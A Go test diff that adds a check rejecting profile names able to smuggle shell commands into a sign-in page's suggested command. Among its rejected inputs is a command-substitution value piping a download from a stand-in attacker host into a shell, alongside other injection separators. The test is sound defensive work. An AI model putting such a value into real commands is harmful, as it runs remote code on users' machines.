@@ -207,3 +207,22 @@ func TestHostOf(t *testing.T) {
 		}
 	}
 }
+
+// A profile's name is written into the command the sign-in page offers
+// when it cannot reach the client, and a command is pasted into a shell.
+// So the name is a host name or a word, and a link that carried a command
+// in the name is refused at both ends.
+func TestAProfileNameIsSomethingAShellDoesNothingWith(t *testing.T) {
+	t.Parallel()
+
+	for _, name := range []string{"staging", "mail.example.com", "mail.example.com:8443", "[::1]", "work_2026"} {
+		if !isProfileName(name) {
+			t.Errorf("%q was refused", name)
+		}
+	}
+	for _, name := range []string{"", "$(curl evil.example|sh)", "a;b", "a b", "`x`", "-flag", "a|b", "a&b"} {
+		if isProfileName(name) {
+			t.Errorf("%q was accepted", name)
+		}
+	}
+}
